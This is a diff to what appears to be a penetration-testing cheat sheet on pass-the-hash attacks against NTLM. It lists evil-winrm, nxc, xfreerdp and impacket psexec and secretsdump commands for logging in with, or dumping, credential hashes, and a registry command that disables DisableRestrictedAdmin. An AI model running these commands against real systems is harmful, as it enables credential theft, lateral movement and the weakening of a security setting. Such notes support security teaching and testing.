@@ -387,9 +387,10 @@ Legacy systems using NTLM instead of Kerberos <small>(or alternatives)</small> m
 
 ```shell!
 $ evil-winrm -i IP -u username -H "hash" # WinRM protocol
-$ impacket-psexec -hashes :hash username@IP
 $ nxc smb IP/32 -u username -d . -H hash
 $ xfreerdp  /v:IP /u:username /pth:hash
+$ impacket-psexec -hashes :hash username@IP
+$ impacket-secretsdump -just-dc-user example/administrator username@IP -hashes xxx:yyy
 ```
 
 ⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` <small>(registry permission required)</small>.
